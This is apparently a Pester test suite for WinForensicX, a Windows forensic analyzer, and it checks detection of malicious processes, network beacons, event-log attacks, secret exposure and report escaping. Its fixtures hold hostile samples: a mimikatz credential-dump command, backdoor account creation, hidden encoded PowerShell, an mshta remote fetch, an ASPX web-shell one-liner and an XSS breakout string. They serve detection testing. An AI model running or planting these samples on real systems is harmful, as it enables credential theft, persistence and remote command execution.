# Pester 4/5 compatible. Runs on any OS: analyzers are pure functions over normalized data.
$here = Split-Path -Parent $PSCommandPath
$root = Split-Path -Parent $here
foreach ($f in @(Get-ChildItem (Join-Path $root 'WinForensicX/Private') -Filter *.ps1) + @(Get-ChildItem (Join-Path $root 'WinForensicX/Analyzers') -Filter *.ps1)) { . $f.FullName }
$script:WfxRuleRoot = Join-Path $root 'WinForensicX/Rules'

function Find-Id { param($Findings, $Id) @($Findings | Where-Object { $_.Id -eq $Id }) }

Describe 'Core helpers' {
    It 'computes Shannon entropy' {
        (Get-WfxEntropy 'aaaa') | Should -Be 0
        (Get-WfxEntropy 'ab') | Should -Be 1
        (Get-WfxEntropy 'password123!@#XYZ') | Should -BeGreaterThan 3
    }
    It 'redacts secrets to type + length, never the value' {
        $r = Find-WfxSecret 'key = sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghij'
        @($r).Count | Should -BeGreaterThan 0
        $r[0].Type | Should -Be 'Anthropic API key'
        $r[0].Redacted | Should -Not -Match 'ABCDEFGHIJKLMNOP'
    }
    It 'scrubs passwords and keys from free text' {
        (Protect-WfxText 'net user bob P@ssw0rd123 /add') | Should -Not -Match 'P@ssw0rd123'
        (Protect-WfxText 'curl https://u:supersecret@host/') | Should -Not -Match 'supersecret'
        (Protect-WfxText '-Password Hunter2') | Should -Not -Match 'Hunter2'
    }
    It 'scrubs identifier-embedded and whitespace-delimited credential names' {
        (Protect-WfxText 'aws configure set aws_secret_access_key wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY') | Should -Not -Match 'wJalrXUtnFEMIK7MDENG'
        (Protect-WfxText 'mysql -uroot -pSup3rSecretPw dbname') | Should -Not -Match 'Sup3rSecretPw'
        (Protect-WfxText 'MYSQL_PWD=Hunter2Hunter2') | Should -Not -Match 'Hunter2Hunter2'
    }
    It 'identifies user-writable and system paths' {
        (Test-WfxUserWritablePath 'C:\Users\bob\AppData\Local\Temp\x.exe') | Should -BeTrue
        (Test-WfxUserWritablePath 'C:\Windows\System32\svchost.exe') | Should -BeFalse
        (Test-WfxSystemPath 'C:\Windows\System32\lsass.exe') | Should -BeTrue
    }
    It 'classifies private vs public IPs' {
        (Test-WfxPrivateIp '10.0.0.5') | Should -BeTrue
        (Test-WfxPrivateIp '192.168.1.1') | Should -BeTrue
        (Test-WfxPrivateIp '203.0.113.9') | Should -BeFalse
        (Test-WfxPrivateIp '::1') | Should -BeTrue
    }
    It 'extracts the image path from a command line' {
        (Get-WfxImagePath '"C:\Program Files\App\a.exe" -x') | Should -Be 'C:\Program Files\App\a.exe'
        (Get-WfxImagePath 'powershell.exe -enc AAAA') | Should -Be 'powershell.exe'
    }
}

Describe 'Scoring model' {
    It 'rises with severity and never exceeds 100' {
        $one = @(New-WfxFinding -Id a -Title x -Category c -Severity Critical -Confidence High)
        $two = $one + (New-WfxFinding -Id b -Title y -Category c -Severity Critical -Confidence High)
        (Get-WfxRiskScore $one).Score | Should -BeGreaterThan 40
        (Get-WfxRiskScore $two).Score | Should -BeGreaterThan (Get-WfxRiskScore $one).Score
        (Get-WfxRiskScore $two).Score | Should -BeLessOrEqual 100
    }
    It 'does not let many lows add up to a critical' {
        $lows = 1..20 | ForEach-Object { New-WfxFinding -Id "l$_" -Title x -Category c -Severity Low -Confidence Low -Entity "e$_" }
        (Get-WfxRiskScore $lows).Score | Should -BeLessThan 75
    }
}

Describe 'Process analyzer' {
    BeforeAll {
        $script:procs = @(
            [pscustomobject]@{ Pid = 10; Name = 'powershell.exe'; Path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; CommandLine = 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'; ParentName = 'winword.exe'; SignatureStatus = 'Valid' }
            [pscustomobject]@{ Pid = 20; Name = 'lsass.exe'; Path = 'C:\Users\bob\AppData\lsass.exe'; CommandLine = 'lsass.exe'; ParentName = 'explorer.exe'; SignatureStatus = 'NotSigned' }
            [pscustomobject]@{ Pid = 30; Name = 'svchost.exe'; Path = 'C:\Windows\System32\svchost.exe'; CommandLine = 'svchost.exe -k netsvcs'; ParentName = 'services.exe'; SignatureStatus = 'Valid' }
            [pscustomobject]@{ Pid = 40; Name = 'mimikatz.exe'; Path = 'C:\Users\bob\Desktop\mimikatz.exe'; CommandLine = 'mimikatz.exe sekurlsa::logonpasswords'; ParentName = 'cmd.exe'; SignatureStatus = 'NotSigned' }
            [pscustomobject]@{ Pid = 50; Name = 'net.exe'; Path = 'C:\Windows\System32\net.exe'; CommandLine = 'net user backdoor Sup3rSecretPw! /add'; ParentName = 'cmd.exe'; SignatureStatus = 'Valid' }
        )
        $script:pf = Invoke-WfxProcessAnalyzer -Process $procs -HostName 'H'
    }
    It 'flags encoded PowerShell' { (Find-Id $pf 'LOTL-PS-ENCODED').Count | Should -Be 1 }
    It 'flags Office spawning a script host' { (Find-Id $pf 'PROC-OFFICE-SPAWN').Count | Should -Be 1 }
    It 'flags a system name from the wrong path' { (Find-Id $pf 'PROC-SYSNAME-WRONGPATH').Count | Should -Be 1 }
    It 'flags parent spoofing of lsass' { (Find-Id $pf 'PROC-PARENT-SPOOF').Count | Should -Be 1 }
    It 'flags known offensive tools' { (Find-Id $pf 'PROC-OFFENSIVE-TOOL').Count | Should -Be 1 }
    It 'does not flag a clean svchost' { @($pf | Where-Object { $_.Entity -like '*svchost*' }).Count | Should -Be 0 }
    It 'flags command-line account creation' { (Find-Id $pf 'LOTL-ACCOUNT-CREATE').Count | Should -Be 1 }
    It 'redacts secrets inside evidence command lines (not tool names)' {
        $json = $pf | ConvertTo-Json -Depth 6
        $json | Should -Not -Match 'Sup3rSecretPw'
        $json | Should -Match 'sekurlsa::logonpasswords'   # tool commands stay visible for the analyst
    }
}

Describe 'Network, DNS and beacon analyzers' {
    It 'flags exposed listeners and tunnels' {
        $conns = @(
            [pscustomobject]@{ Protocol = 'TCP'; LocalAddress = '0.0.0.0'; LocalPort = 11434; State = 'Listen'; Pid = 1; Process = 'ollama.exe' }
            [pscustomobject]@{ Protocol = 'TCP'; LocalAddress = '10.0.0.5'; RemoteAddress = '198.51.100.2'; RemotePort = 443; RemoteHost = 'abc.ngrok.io'; State = 'Established'; Pid = 2; Process = 'app.exe' }
        )
        $nf = Invoke-WfxNetworkAnalyzer -Connection $conns -HostName 'H'
        (Find-Id $nf 'AI-OLLAMA-EXPOSED').Count | Should -Be 1
        (Find-Id $nf 'NET-TUNNEL-SERVICE').Count | Should -Be 1
    }
    It 'flags DGA, suspicious TLDs and paste sites, but not clean domains' {
        $dns = @('kq3x9zmnvbwp7h.top', 'www.microsoft.com', 'paste.ee', 'github.com') | ForEach-Object { [pscustomobject]@{ Name = $_ } }
        $df = Invoke-WfxDnsAnalyzer -DnsEntry $dns -HostName 'H'
        (Find-Id $df 'DNS-SUSPICIOUS-TLD').Count | Should -Be 1
        (Find-Id $df 'DNS-PASTE-SITE').Count | Should -Be 1
        @($df | Where-Object { $_.Entity -like '*microsoft*' -or $_.Entity -like '*github*' }).Count | Should -Be 0
    }
    It 'flags low-jitter beaconing but ignores irregular traffic' {
        $base = Get-Date
        $regular = [pscustomobject]@{ Remote = '203.0.113.9:443'; Times = (0..11 | ForEach-Object { $base.AddSeconds($_ * 60) }) }
        $jittery = [pscustomobject]@{ Remote = '203.0.113.10:443'; Times = (0..11 | ForEach-Object { $base.AddSeconds((Get-Random -Min 10 -Max 600)) }) }
        (Find-Id (Invoke-WfxBeaconAnalyzer -Beacon @($regular) -HostName 'H') 'NET-BEACON').Count | Should -Be 1
        (Find-Id (Invoke-WfxBeaconAnalyzer -Beacon @($jittery) -HostName 'H') 'NET-BEACON').Count | Should -Be 0
    }
}

Describe 'Event analyzer' {
    It 'detects password spraying as a single aggregate finding' {
        $ev = 1..12 | ForEach-Object { [pscustomobject]@{ Log = 'Security'; Id = 4625; TimeCreated = (Get-Date); Fields = @{ TargetUserName = "u$_"; IpAddress = '203.0.113.9'; LogonType = '3' } } }
        $ef = Invoke-WfxEventAnalyzer -Event $ev -HostName 'H'
        (Find-Id $ef 'EVT-4625-SPRAY').Count | Should -Be 1
    }
    It 'runs LotL rules over 4688 process creation events' {
        $ev = @([pscustomobject]@{ Log = 'Security'; Id = 4688; TimeCreated = (Get-Date); Fields = @{ NewProcessName = 'C:\Windows\System32\mshta.exe'; CommandLine = 'mshta https://x.example/a.hta'; ParentProcessName = 'explorer.exe' } })
        (Find-Id (Invoke-WfxEventAnalyzer -Event $ev -HostName 'H') 'LOTL-MSHTA').Count | Should -Be 1
    }
    It 'detects a cleared security log' {
        $ev = @([pscustomobject]@{ Log = 'Security'; Id = 1102; TimeCreated = (Get-Date); Fields = @{ SubjectUserName = 'a' } })
        (Find-Id (Invoke-WfxEventAnalyzer -Event $ev -HostName 'H') 'EVT-1102-CLEARED').Count | Should -Be 1
    }
}

Describe 'File and exposure analyzers' {
    It 'detects web shells and double extensions' {
        $files = @(
            [pscustomobject]@{ Path = 'C:\inetpub\x.aspx'; Extension = '.aspx'; InWebRoot = $true; Content = '<% Process.Start("cmd.exe","/c "+Request["c"]); %>'; LastWrite = (Get-Date) }
            [pscustomobject]@{ Path = 'C:\Users\bob\Downloads\invoice.pdf.exe'; Extension = '.exe'; LastWrite = (Get-Date) }
        )
        $ff = Invoke-WfxFileAnalyzer -File $files -HostName 'H'
        (Find-Id $ff 'FILE-WEBSHELL').Count | Should -Be 1
        (Find-Id $ff 'FILE-DOUBLE-EXT').Count | Should -Be 1
    }
    It 'reports secret exposure with the value redacted' {
        $expo = @(
            [pscustomobject]@{ Kind = 'GppCpassword'; Path = '\\dc\SYSVOL\Groups.xml' }
            [pscustomobject]@{ Kind = 'SecretInFile'; Path = 'C:\web.config'; Content = '<add key="k" value="sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab"/>' }
        )
        $xf = Invoke-WfxExposureAnalyzer -Exposure $expo -HostName 'H'
        (Find-Id $xf 'EXPO-GPP-CPASSWORD').Count | Should -Be 1
        ($xf | ConvertTo-Json -Depth 6) | Should -Not -Match 'ABCDEFGHIJKLMNOP'
    }
    It 'flags a ransom note' {
        $note = @([pscustomobject]@{ Path = 'C:\READ_ME.txt'; Content = 'All your files have been encrypted. To decrypt your files, send bitcoin to our .onion site.' })
        (Find-Id (Invoke-WfxRansomwareAnalyzer -Note $note -HostName 'H') 'RANSOM-NOTE').Count | Should -Be 1
    }
    It 'uses a collector-supplied redaction without needing raw content' {
        # The production collector passes only a pre-redacted string (no Content), so raw secrets are never persisted.
        $expo = @([pscustomobject]@{ Kind = 'SecretInEnv'; Path = 'env:Machine'; Detail = 'AWS_SECRET_ACCESS_KEY'; Redacted = @('AWS_SECRET_ACCESS_KEY (Machine): wJal…[redacted, 40 chars]') })
        $xf = Invoke-WfxExposureAnalyzer -Exposure $expo -HostName 'H'
        $f = Find-Id $xf 'EXPO-SECRETINENV'
        $f.Count | Should -Be 1
        (@($f[0].Evidence.Redacted) -join ';') | Should -Match 'redacted, 40 chars'
    }
    It 'routes an AI provider key to the AiKey finding, redacted' {
        $expo = @([pscustomobject]@{ Kind = 'AiKey'; Path = 'env:User:ANTHROPIC_API_KEY'; Detail = 'Anthropic API key'; Redacted = @('Anthropic API key: sk-a…[redacted, 60 chars]') })
        $xf = Invoke-WfxExposureAnalyzer -Exposure $expo -HostName 'H'
        (Find-Id $xf 'AI-KEY-EXPOSED').Count | Should -Be 1
        ($xf | ConvertTo-Json -Depth 6) | Should -Not -Match 'sk-ant-api'
    }
}

Describe 'Posture analyzer' {
    It 'flags AV off, no process auditing, firewall off and RDP without NLA' {
        $posture = [pscustomobject]@{
            Defender     = [pscustomobject]@{ Installed = $true; RealTimeProtectionEnabled = $false; AntivirusEnabled = $false; TamperProtectionEnabled = $true; SignatureAgeDays = 2; ExclusionPath = @(); ExclusionProcess = @() }
            ThirdPartyAV = @()
            Firewall     = [pscustomobject]@{ Domain = $true; Private = $true; Public = $false }
            Audit        = [pscustomobject]@{ ProcessCreation = $false; CommandLineInProcessCreation = $false; ScriptBlockLogging = $false; SysmonInstalled = $false }
            Rdp          = [pscustomobject]@{ Enabled = $true; NlaEnabled = $false }
            Lsa          = [pscustomobject]@{ RunAsPPL = $true; CredentialGuard = $true }
        }
        $pf = Invoke-WfxPostureAnalyzer -Posture $posture -HostName 'H'
        (Find-Id $pf 'POSTURE-AV-DISABLED').Count | Should -Be 1
        (Find-Id $pf 'POSTURE-NO-PROCESS-AUDIT').Count | Should -Be 1
        (Find-Id $pf 'POSTURE-NO-SCRIPTBLOCK-LOG').Count | Should -Be 1
        (Find-Id $pf 'POSTURE-FIREWALL-OFF').Count | Should -Be 1
        (Find-Id $pf 'POSTURE-RDP-NO-NLA').Count | Should -Be 1
        (Find-Id $pf 'POSTURE-LSASS-UNPROTECTED').Count | Should -Be 0   # PPL + CredGuard on → no finding
    }
    It 'flags a suspicious Defender exclusion covering a user-writable path' {
        $posture = [pscustomobject]@{
            Defender = [pscustomobject]@{ Installed = $true; RealTimeProtectionEnabled = $true; AntivirusEnabled = $true; TamperProtectionEnabled = $true; SignatureAgeDays = 1
                ExclusionPath = @('C:\Users\Public\Downloads'); ExclusionProcess = @('powershell.exe') }
            ThirdPartyAV = @(); Audit = $null; Firewall = $null; Rdp = $null; Lsa = $null
        }
        $pf = Invoke-WfxPostureAnalyzer -Posture $posture -HostName 'H'
        (Find-Id $pf 'POSTURE-DEFENDER-EXCLUSION').Count | Should -Be 1
        (Find-Id $pf 'POSTURE-DEFENDER-PROC-EXCLUSION').Count | Should -Be 1
    }
    It 'stays quiet on a well-configured host' {
        $posture = [pscustomobject]@{
            Defender     = [pscustomobject]@{ Installed = $true; RealTimeProtectionEnabled = $true; AntivirusEnabled = $true; TamperProtectionEnabled = $true; SignatureAgeDays = 1; ExclusionPath = @(); ExclusionProcess = @() }
            ThirdPartyAV = @()
            Firewall     = [pscustomobject]@{ Domain = $true; Private = $true; Public = $true }
            Audit        = [pscustomobject]@{ ProcessCreation = $true; CommandLineInProcessCreation = $true; ScriptBlockLogging = $true; SysmonInstalled = $true }
            Rdp          = [pscustomobject]@{ Enabled = $false; NlaEnabled = $true }
            Lsa          = [pscustomobject]@{ RunAsPPL = $true; CredentialGuard = $true }
        }
        $pf = Invoke-WfxPostureAnalyzer -Posture $posture -HostName 'H'
        @($pf).Count | Should -Be 0
    }
}

Describe 'HTML report safety' {
    BeforeAll {
        . (Join-Path $root 'WinForensicX/Report/Theme.ps1')
        . (Join-Path $root 'WinForensicX/Report/Report.ps1')
    }
    It 'neutralizes script-breakout attempts in finding fields' {
        $f = New-WfxFinding -Id 'X-TEST' -Title 'proc</script><script>alert(document.domain)</script>' -Category 'File' -Severity 'High' -Confidence 'High' -Entity 'file:x' -HostName 'H'
        $res = [pscustomobject]@{ HostName='H'; Host=$null; Risk=[pscustomobject]@{Score=10;Level='Low'}; Summary=(Get-WfxSeveritySummary @($f)); Findings=@($f); AttackCoverage=@(); Gaps=@(); Meta=$null }
        $out = Join-Path ([IO.Path]::GetTempPath()) ("wfxsec_"+[guid]::NewGuid().ToString('N').Substring(0,8)+'.html')
        New-WfxReport -Result $res -Path $out | Out-Null
        $html = Get-Content $out -Raw
        # The injected close tag must not survive literally; it is \u-escaped inside the JSON island.
        $html | Should -Not -Match '</script><script>alert'
        $html | Should -Match '\\u003c/script'
        # Exactly the two template <script> tags remain (data island + app script).
        ([regex]::Matches($html,'<script')).Count | Should -Be 2
        Remove-Item $out -Force -ErrorAction SilentlyContinue
    }
}

Describe 'Exposure collector redaction (pure helper)' {
    BeforeAll { . (Join-Path $root 'WinForensicX/Collectors/Exposure.ps1') }
    It 'redacts command-line secret flags and whitespace-delimited values' {
        $hits = Get-WfxRedactedHits "mysql -uroot -pSup3rSecretPw db`naws configure set aws_secret_access_key wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"
        ($hits | ConvertTo-Json) | Should -Not -Match 'Sup3rSecretPw'
        ($hits | ConvertTo-Json) | Should -Not -Match 'wJalrXUtnFEMIK7MDENG'
        @($hits).Count | Should -BeGreaterThan 0
    }
    It 'reduces known keys and generic assignments to type + length, never the value' {
        $text = @'
ANTHROPIC_API_KEY=sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefgh
db_password = Sup3rSecretValue123
placeholder=changeme
'@
        $hits = Get-WfxRedactedHits $text
        @($hits).Count | Should -BeGreaterThan 1
        ($hits | ConvertTo-Json) | Should -Not -Match 'ABCDEFGHIJKLMNOP'
        ($hits | ConvertTo-Json) | Should -Not -Match 'Sup3rSecretValue123'
        # a pure placeholder must not be reported as a secret
        @($hits | Where-Object { $_.Redacted -match 'changeme' }).Count | Should -Be 0
    }
}

Describe 'Rule packs' {
    It 'every LotL rule matches its own samples and avoids its counter-samples' {
        $pack = Get-WfxRulePack 'lotl'
        foreach ($r in $pack.rules) {
            foreach ($m in $r.tests.match) { @(Test-WfxCommandLine -CommandLine $m | Where-Object { $_.id -eq $r.id }).Count | Should -BeGreaterThan 0 -Because "$($r.id) should match: $m" }
            foreach ($n in $r.tests.nomatch) { @(Test-WfxCommandLine -CommandLine $n | Where-Object { $_.id -eq $r.id }).Count | Should -Be 0 -Because "$($r.id) should NOT match: $n" }
        }
    }
    It 'every rule technique is a known ATT&CK id' {
        foreach ($name in 'lotl', 'events', 'ai') {
            foreach ($r in (Get-WfxRulePack $name).rules) {
                foreach ($t in @($r.technique)) { $script:WfxAttack.ContainsKey($t) | Should -BeTrue -Because "$($r.id) references $t" }
            }
        }
    }
    It 'a malicious regex cannot hang analysis (timeout guard)' {
        $rx = New-WfxRegex '(a+)+$'
        $bad = ('a' * 40) + '!'
        (Test-WfxRegex $rx $bad) | Should -BeFalse   # returns false on timeout instead of hanging
    }
}
